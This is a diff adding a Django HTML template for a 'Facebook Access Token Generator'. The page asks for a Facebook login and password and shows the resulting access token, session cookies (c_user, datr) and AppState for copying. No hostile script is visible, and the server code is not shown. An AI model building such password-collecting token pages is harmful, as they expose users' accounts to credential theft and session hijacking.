@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Facebook Token Generator</title>
+<style>
+body {
+    font-family: 'Segoe UI', sans-serif;
+    background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
+    color: #e0e0e0;
+    padding: 30px 20px;
+    line-height: 1.6;
+}
+
+h2 {
+    font-size: 28px;
+    margin-bottom: 25px;
+    color: #00e5ff;
+    text-align: center;
+    text-shadow: 0 0 8px rgba(0, 229, 255, 0.5);
+}
+
+.wrapper {
+    background: rgba(28, 28, 28, 0.95);
+    padding: 30px 25px;
+    border-radius: 15px;
+    width: 100%;
+    max-width: 100%;
+    margin: 60px auto;
+    box-shadow: 0 0 20px rgba(0, 229, 255, 0.2);
+    backdrop-filter: blur(8px);
+}
+
+input, button, textarea {
+    width: 100%;
+    padding: 12px 14px;
+    margin-top: 12px;
+    border-radius: 10px;
+    border: none;
+    font-size: 16px;
+    box-sizing: border-box;
+    background-color: #111;
+    color: #f1f1f1;
+    transition: 0.3s ease;
+    box-shadow: inset 0 0 5px rgba(255, 255, 255, 0.05);
+}
+
+input::placeholder,
+textarea::placeholder {
+    color: #aaa;
+}
+
+input:focus, textarea:focus {
+    outline: none;
+    background-color: #1a1a1a;
+    box-shadow: 0 0 6px #00e5ff;
+}
+
+button[type="submit"] {
+    background: linear-gradient(to right, #00e5ff, #00c6ff);
+    color: #fff;
+    font-weight: bold;
+    cursor: pointer;
+    transition: 0.3s ease;
+    box-shadow: 0 0 8px rgba(0, 229, 255, 0.5);
+}
+
+button[type="submit"]:hover {
+    background: linear-gradient(to right, #00bcd4, #0097a7);
+    box-shadow: 0 0 10px rgba(0, 229, 255, 0.7);
+}
+
+button.copy-btn {
+    width: auto;
+    background: #222;
+    color: #eee;
+    margin-top: 5px;
+    font-size: 14px;
+    float: right;
+    padding: 6px 14px;
+    border-radius: 6px;
+    cursor: pointer;
+    transition: 0.3s ease;
+    border: 1px solid #00bcd4;
+}
+
+button.copy-btn:hover {
+    background: #00bcd4;
+    color: #fff;
+}
+
+textarea {
+    resize: vertical;
+    min-height: 80px;
+    max-height: 300px;
+    margin-bottom: 5px;
+    font-family: monospace;
+}
+
+#token { min-height: 170px; }
+#cuser { min-height: 50px; }
+#cookie { min-height: 170px; }
+#appstate { min-height: 380px; }
+
+label {
+    margin-top: 18px;
+    display: block;
+    font-weight: bold;
+    color: #ddd;
+    text-shadow: 0 0 3px #00bcd4;
+}
+
+::selection {
+    background: #00bcd4;
+    color: #fff;
+}
+</style>
+</head>
+<body>
+    <div class="wrapper">
+    <h2>Facebook Access Token Generator</h2>
+    <form method="post">
+        {% csrf_token %}
+        <input type="text" name="email" placeholder="Facebook Email / Phone / UID" required>
+        <input type="password" name="password" placeholder="Facebook Password" required>
+        <button type="submit">Generate</button>
+    </form>
+        </div>
+    {% if error %}
+        <div style="color: red; margin-top: 10px;">{{ error }}</div>
+    {% endif %}
+
+    {% if result %}
+        <label>Access Token:</label>
+        <textarea id="token" readonly>{{ result.token }}</textarea>
+        <button class="copy-btn" onclick="copyToClipboard('token', this)">Copy</button>
+
+        <label>Cookie:</label>
+        <textarea id="cookie" readonly>{{ result.cookie }}</textarea>
+        <button class="copy-btn" onclick="copyToClipboard('cookie', this)">Copy</button>
+
+        <label>c_user:</label>
+        <textarea id="cuser" readonly>{{ result.c_user }}</textarea>
+        <button class="copy-btn" onclick="copyToClipboard('cuser', this)">Copy</button>
+
+        <label>datr:</label>
+        <textarea id="datr" readonly>{{ result.datr }}</textarea>
+        <button class="copy-btn" onclick="copyToClipboard('datr', this)">Copy</button>
+
+        <label>AppState:</label>
+        <textarea id="appstate" readonly>{{ result.appstate }}</textarea>
+        <button class="copy-btn" onclick="copyToClipboard('appstate', this)">Copy</button>
+    {% endif %}
+    
+    <script>
+        function copyToClipboard(id, btn) {
+            const textArea = document.getElementById(id);
+            textArea.select();
+            textArea.setSelectionRange(0, 99999); // Mobile support
+            document.execCommand("copy");
+            const originalText = btn.textContent;
+            btn.textContent = "Copied!";
+            setTimeout(() => {
+                btn.textContent = originalText;
+            }, 1000);
+        }
+    </script>
+</body>
+<p style="text-align: center; font-size: 14px; color: gray;">
+  &copy; 2025 Luffy. All rights reserved.
+</p>
+</html>
